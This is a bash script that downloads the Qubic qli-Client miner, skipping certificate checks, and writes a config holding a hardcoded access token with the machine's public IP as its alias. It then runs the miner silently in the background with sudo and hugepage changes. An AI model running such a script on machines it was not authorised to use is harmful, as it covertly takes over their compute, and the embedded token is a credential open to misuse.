#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6Ijc3NWYwYTgxLTc4OGEtNDgxOS05NDJlLThmOGNlZGEwMzQ3ZiIsIk1pbmluZyI6IiIsIm5iZiI6MTczMzYyMjgxNywiZXhwIjoxNzY1MTU4ODE3LCJpYXQiOjE3MzM2MjI4MTcsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.vIwPLflwWte3isVqfjY3cbxpOniaHC1-SHQigz4vcVaA6Yc5P1gL7KNvaALmsseVWQOSm9KeRP9logtUgRXEvuafKsXb4m8C3ycd8PFIv7kVCNsocU3xi0S5wj-DVNhmSCG0HVbK3Z3jcppfFF0hvQR4eiEH1Thfea4oBjZEDSjaNWPuIJCLw8BD5OI3L8y1a0xAm5b42yLXPnxHOQ76fmldEmebJOPlfi0OjNPR5D6QYj-lvTVu9jJVGBVPGZxFl5fiSOOUReBKrEelZTN7wlln4QqvjRhQslPkhysGxV6QF8G_LGxkawVEBahHBsDosJGiha1cP_fCGg729VGp3A"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1 &
